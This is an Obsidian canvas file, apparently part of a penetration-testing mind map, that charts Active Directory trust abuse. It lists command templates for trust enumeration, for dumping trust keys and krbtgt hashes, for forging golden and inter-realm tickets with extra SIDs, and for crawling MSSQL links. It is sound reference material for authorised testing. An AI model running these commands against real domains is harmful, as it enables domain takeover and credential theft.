{
	"nodes":[
		{"id":"c8beb37b304f70d9","type":"group","x":-4240,"y":-400,"width":8380,"height":7760,"color":"#96826e","label":"TRUST ABUSE"},
		{"id":"2286c735c2d990db","type":"group","x":7360,"y":5980,"width":1080,"height":763,"color":"#32a5ff","label":"KERBEROS DELEGATION ABUSE"},
		{"id":"a5d164b1aa4e436b","type":"group","x":-6720,"y":3100,"width":1080,"height":760,"label":"NO CREDENTIALS"},
		{"id":"5c521b11ddfe32b2","type":"group","x":7360,"y":480,"width":1080,"height":760,"color":"6","label":"LATERAL MOVE"},
		{"id":"f4a5d668c00f7a85","type":"group","x":7360,"y":2080,"width":1080,"height":760,"color":"#324bff","label":"DACL ABUSE"},
		{"id":"24be4707e817b323","type":"group","x":7360,"y":4400,"width":1080,"height":760,"color":"#7806a0","label":"ADCS ABUSE"},
		{"id":"6c7ea83ebfab6a88","type":"text","text":"# TRUST ABUSE","x":-3965,"y":3432,"width":365,"height":50,"color":"#96826e"},
		{"id":"00ec63f4dbb988a2","type":"text","text":"# trustlink","x":-1282,"y":2240,"width":250,"height":60},
		{"id":"670e0a7e5fcc9089","type":"text","text":"# sp_linkedservers","x":-977,"y":2240,"width":340,"height":60},
		{"id":"de12538a2389e1b3","type":"text","text":"# coerce parent_dc on child_dc domain","x":-891,"y":1379,"width":600,"height":77},
		{"id":"330721f80e2b473e","type":"text","text":"# use_link","x":-597,"y":2240,"width":180,"height":60},
		{"id":"b09c5d4616f8e245","type":"text","text":"# MSSQL","x":1786,"y":2250,"width":520,"height":50,"color":"6"},
		{"id":"9ee88a72a9feede6","type":"text","text":"# LATERAL MOVE","x":1786,"y":1775,"width":520,"height":50,"color":"6"},
		{"id":"fbb7cb93d43b1fa6","type":"text","text":"# LATERAL MOVE","x":1792,"y":855,"width":520,"height":50,"color":"6"},
		{"id":"1cb8321ceba10c50","type":"text","text":"# unconstrained delegation","x":1792,"y":1392,"width":520,"height":50,"color":"#32a5ff"},
		{"id":"44adb0b642e76f4d","type":"text","text":"# Unconstrained delegation\n\n","x":-1582,"y":1374,"width":431,"height":87},
		{"id":"0068dfc8a7b7ae8f","type":"text","text":"# Enumeration\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/trusts/#trusts\n\n\n>[!example] Tools\n>- [ldeep](https://github.com/franc-pentest/ldeep)\n>- [sharphound](https://github.com/SpecterOps/SharpHound)\n>- [powersploit](https://github.com/PowerShellMafia/PowerSploit)\n\n```shell\n#Commands\nðŸŸ£ lookupsid.py -domain-sids '<domain>'/'<user>':'<password>'@'<dc>' 0 lookupsid.py -domain-sids '<domain>'/'<user>':'<password>'@'<target_dc>' 0\nðŸ”µ Get-DomainTrust -Domain '<domain>'\nðŸ”µ Get-DomainTrustMapping\nðŸ”µ ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\nâšª ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s ldap://'<dc_ip>' trusts\nâš« sharphound.exe -c trusts -d '<domain>'\nðŸ”µ Get-DomainSID -Domain '<domain>' Get-DomainSID -Domain '<target_domain>'\n\n```","x":-2977,"y":-160,"width":2560,"height":640},
		{"id":"3c2f769b039ebf01","type":"text","text":"# Child->Parent && Parent->Child Trusts\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/trusts/#trust-types\n\n\n>[!example] Tools\n>- [mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)\n>- [ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)\n>- [raiseChild](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py)\n\n```shell\n#  Trust Key  \nðŸ”µ mimikatz lsadump::trust /patch\nðŸ”µ mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt\n# Golden Ticket\nðŸ”µ mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt\nðŸ”µ mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt\nðŸŸ£ raiseChild.py <child_domain>/<user>:<password>\nðŸŸ£ ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser\n\n```","x":-2977,"y":560,"width":2560,"height":640},
		{"id":"311c8ae9bb70308f","type":"text","text":"# Mssql links \n\n>[!info] Theory\n>- https://www.netspi.com/blog/technical-blog/network-pentesting/how-to-hack-database-links-in-sql-server/\n\n\n>[!example] Tools\n>- [powerupsql](https://github.com/NetSPI/PowerUpSQL)\n>- [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)\n\n\n```shell\n#Commands\nðŸŸ£ mssqlclient.py -windows-auth '<domain>'/'<user>':'<password>'@'<ip>'\nðŸ”µ Get-SQLServerLinkCrawl -username '<user>' -password '<pass>' -Verbose -Instance '<sql_instance>'\n```","x":-2977,"y":1560,"width":2560,"height":480},
		{"id":"0ff6b97a57cb6a52","type":"text","text":"# LATERAL MOVE","x":3418,"y":6654,"width":520,"height":50,"color":"6"},
		{"id":"3026b94fc486cecb","type":"text","text":"# LATERAL MOVE","x":3418,"y":3979,"width":520,"height":50,"color":"6"},
		{"id":"f7b82a5bb890cb10","type":"text","text":"# unconstrained delegation","x":3412,"y":4516,"width":520,"height":50,"color":"#32a5ff"},
		{"id":"88a50fc9d31de51b","type":"text","text":"# ADCS ABUSE","x":3412,"y":4694,"width":520,"height":50,"color":"#7806a0"},
		{"id":"58604ba05971351d","type":"text","text":"# PERMISSIONS ABUSE","x":3412,"y":3301,"width":520,"height":50,"color":"#324bff"},
		{"id":"b5d87fd18d704d77","type":"text","text":"# SID History on FOREST B \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/trusts/#sid-history\n\n\n>[!example] Tools\n>- [mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)\n>- [ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)\n\n\n```shell\n# FORGING a Golden ticket with mimikatz\nâš« mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt\nâš« mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt\n# forging a golden ticket with ticketer\nðŸŸ£ ticketer.py -nthash '<krbtgt>' -domain-sid '<domain_a>' -domain '<domain_a>' -extra-sid '<domain_b_sid>' -group_sid '<sup 1000>' fakeuser\n\n# Trust ticket\nðŸŸ£ secretsdump.py -just-dc-user '<domainB>' '<domainA>'/'<user>':'<password>'@'<dc_a>'\nðŸŸ£ ticketer.py -nthash '<trust_hash>' -domain-sid '<sid_a>' -domain '<domain_a>' -extra-sid '<domain_b_sid>' -group_sid '<sup 1000>' -spn krbtgt/<domain_a> fakeuser\n```","x":-485,"y":3646,"width":2560,"height":666},
		{"id":"8a8908871292491e","type":"text","text":"# Same as double trust, but no unconstrained delegation as B can't connect to A","x":-1026,"y":6294,"width":1170,"height":80},
		{"id":"7debcf8a3ab51604","type":"text","text":"# coerce dc_b on dc_a ","x":555,"y":4526,"width":480,"height":80},
		{"id":"b3c9b547eacdbeaa","type":"text","text":"# ADCS abuse ","x":-485,"y":4526,"width":310,"height":80},
		{"id":"cf7ff647567b323a","type":"text","text":"# Unconstrained delegation ","x":-75,"y":4526,"width":480,"height":80},
		{"id":"f0984fd74ccc53b9","type":"text","text":"# password reuse ","x":-485,"y":2846,"width":310,"height":80},
		{"id":"76f15df89cef02f1","type":"text","text":"# Foreign group and users \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/trusts/#trust-types\n\n\n>[!example] Tools\n>- [bloodhound](https://github.com/SpecterOps/BloodHound)\n\n\n```shell\n# Users with foreign Domain Group Membership\nðŸŸ£ MATCH p=(n:User {domain:\"<DOMAIN.FQDN>\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p\n# Group with foreign Domain Group Membership\nðŸ”µ MATCH p=(n:Group {domain:\"<DOMAIN.FQDN>\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p\n```","x":-485,"y":3086,"width":2560,"height":480},
		{"id":"1fd82d8d7484e7ba","type":"text","text":"# from A to B FOREST_TRANSITIVE","x":-1366,"y":3566,"width":546,"height":80},
		{"id":"d1777019aae5341c","type":"text","text":"# DomainA --> DomainB trust (A trust B / B access A)","x":-2332,"y":6614,"width":822,"height":80},
		{"id":"eeacb5c06507cbec","type":"text","text":"# password reuse ","x":-1040,"y":6614,"width":310,"height":80},
		{"id":"3c05baedcc6cdfa3","type":"text","text":"# DomainA <--> DomainB trust (B trust A, A trust B)","x":-2292,"y":3726,"width":782,"height":80},
		{"id":"3d605ce3d4fa4a37","type":"text","text":"# External Trust ","x":-2807,"y":3886,"width":275,"height":80},
		{"id":"edd6d3baa7653055","type":"text","text":"# from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL","x":-1417,"y":6054,"width":916,"height":60},
		{"id":"c2da872c95e8cb13","type":"text","text":"# DomainA <-- DomainB trust (B trust A / A access B)","x":-2318,"y":6294,"width":822,"height":80},
		{"id":"36f1b87414926105","type":"file","file":"INTERACTIVE-MAP.canvas","x":-6640,"y":3180,"width":920,"height":600},
		{"id":"4e3c2e91a9f30e6a","type":"file","file":"ATTACKS/KERBEROS DELEGATION ABUSE.canvas","x":7440,"y":6063,"width":920,"height":600,"color":"#32a5ff"},
		{"id":"295f7960fc1cfda9","type":"file","file":"ATTACKS/ADCS ABUSE.canvas","x":7440,"y":4478,"width":920,"height":600,"color":"#7806a0"},
		{"id":"c271b6e3607e4138","type":"file","file":"ATTACKS/PERMISSIONS ABUSE.canvas","x":7440,"y":2160,"width":920,"height":600,"color":"#324bff"},
		{"id":"2a77985e33776eba","type":"file","file":"ATTACKS/LATERAL MOVE.canvas","x":7440,"y":562,"width":920,"height":600,"color":"6"}
	],
	"edges":[
		{"id":"4fc094bcaeceda07","fromNode":"44adb0b642e76f4d","fromSide":"right","toNode":"de12538a2389e1b3","toSide":"left"},
		{"id":"586d7f6cc01d9914","fromNode":"00ec63f4dbb988a2","fromSide":"right","toNode":"670e0a7e5fcc9089","toSide":"left"},
		{"id":"1a2211e46ff844e4","fromNode":"670e0a7e5fcc9089","fromSide":"right","toNode":"330721f80e2b473e","toSide":"left"},
		{"id":"1029c03bc801309a","fromNode":"311c8ae9bb70308f","fromSide":"bottom","toNode":"00ec63f4dbb988a2","toSide":"left"},
		{"id":"a1ad5fa08502f35f","fromNode":"330721f80e2b473e","fromSide":"right","toNode":"b09c5d4616f8e245","toSide":"left"},
		{"id":"8ad6468095dc04a7","fromNode":"311c8ae9bb70308f","fromSide":"right","toNode":"9ee88a72a9feede6","toSide":"left"},
		{"id":"f1d5d3aafb03191c","fromNode":"3c2f769b039ebf01","fromSide":"bottom","toNode":"44adb0b642e76f4d","toSide":"left"},
		{"id":"f2146e017b203496","fromNode":"de12538a2389e1b3","fromSide":"right","toNode":"1cb8321ceba10c50","toSide":"left"},
		{"id":"c17468e1122da176","fromNode":"c2da872c95e8cb13","fromSide":"right","toNode":"8a8908871292491e","toSide":"left"},
		{"id":"8f915b43a81e9a71","fromNode":"d1777019aae5341c","fromSide":"right","toNode":"eeacb5c06507cbec","toSide":"left"},
		{"id":"149306bd293a34fd","fromNode":"3d605ce3d4fa4a37","fromSide":"right","toNode":"3c05baedcc6cdfa3","toSide":"left"},
		{"id":"7377dc6970d480bc","fromNode":"3d605ce3d4fa4a37","fromSide":"right","toNode":"d1777019aae5341c","toSide":"left"},
		{"id":"cfaaf7b7e78db6b6","fromNode":"3d605ce3d4fa4a37","fromSide":"right","toNode":"c2da872c95e8cb13","toSide":"left"},
		{"id":"55c9d0a844a8f447","fromNode":"3c05baedcc6cdfa3","fromSide":"right","toNode":"1fd82d8d7484e7ba","toSide":"left"},
		{"id":"8761fba1ccb1dda1","fromNode":"3c05baedcc6cdfa3","fromSide":"right","toNode":"edd6d3baa7653055","toSide":"left"},
		{"id":"b1017ff02864c672","fromNode":"1fd82d8d7484e7ba","fromSide":"right","toNode":"f0984fd74ccc53b9","toSide":"left"},
		{"id":"21d1be6bcc2c49ec","fromNode":"1fd82d8d7484e7ba","fromSide":"right","toNode":"76f15df89cef02f1","toSide":"left"},
		{"id":"9cd23acdfbed038c","fromNode":"1fd82d8d7484e7ba","fromSide":"right","toNode":"b5d87fd18d704d77","toSide":"left"},
		{"id":"86035c435c36c2c9","fromNode":"1fd82d8d7484e7ba","fromSide":"right","toNode":"b3c9b547eacdbeaa","toSide":"left"},
		{"id":"98b97cf3489b641e","fromNode":"b3c9b547eacdbeaa","fromSide":"right","toNode":"cf7ff647567b323a","toSide":"left"},
		{"id":"af4b20b396ecf7df","fromNode":"cf7ff647567b323a","fromSide":"right","toNode":"7debcf8a3ab51604","toSide":"left"},
		{"id":"4839ba8762901f94","fromNode":"6c7ea83ebfab6a88","fromSide":"right","toNode":"0068dfc8a7b7ae8f","toSide":"left"},
		{"id":"b07a8c1a179c03e9","fromNode":"6c7ea83ebfab6a88","fromSide":"right","toNode":"3c2f769b039ebf01","toSide":"left"},
		{"id":"9cd258d70a9b6e77","fromNode":"6c7ea83ebfab6a88","fromSide":"right","toNode":"311c8ae9bb70308f","toSide":"left"},
		{"id":"7458bc8f46e7f7eb","fromNode":"6c7ea83ebfab6a88","fromSide":"right","toNode":"3d605ce3d4fa4a37","toSide":"left"},
		{"id":"b6a0ce8266c1bd86","fromNode":"a5d164b1aa4e436b","fromSide":"right","toNode":"c8beb37b304f70d9","toSide":"left"},
		{"id":"d6f873e001656dc2","fromNode":"3c2f769b039ebf01","fromSide":"right","toNode":"fbb7cb93d43b1fa6","toSide":"left"},
		{"id":"3996bee629e56895","fromNode":"76f15df89cef02f1","fromSide":"right","toNode":"58604ba05971351d","toSide":"left"},
		{"id":"debc3b07292ff370","fromNode":"b5d87fd18d704d77","fromSide":"right","toNode":"3026b94fc486cecb","toSide":"left"},
		{"id":"90eed7a6d6547dea","fromNode":"7debcf8a3ab51604","fromSide":"right","toNode":"f7b82a5bb890cb10","toSide":"left"},
		{"id":"1bb9487bf147f237","fromNode":"7debcf8a3ab51604","fromSide":"right","toNode":"88a50fc9d31de51b","toSide":"left"},
		{"id":"003cd5aa76e0dcd5","fromNode":"eeacb5c06507cbec","fromSide":"right","toNode":"0ff6b97a57cb6a52","toSide":"left"},
		{"id":"73d34660e9a8f423","fromNode":"c8beb37b304f70d9","fromSide":"right","toNode":"4e3c2e91a9f30e6a","toSide":"left","color":"#32a5ff"},
		{"id":"a8967f6374bf6549","fromNode":"c8beb37b304f70d9","fromSide":"right","toNode":"c271b6e3607e4138","toSide":"left","color":"#324bff"},
		{"id":"3a76bc49df174686","fromNode":"c8beb37b304f70d9","fromSide":"right","toNode":"2a77985e33776eba","toSide":"left","color":"6"},
		{"id":"95a3f16c706e6bb8","fromNode":"c8beb37b304f70d9","fromSide":"right","toNode":"295f7960fc1cfda9","toSide":"left","color":"#7806a0"}
	]
}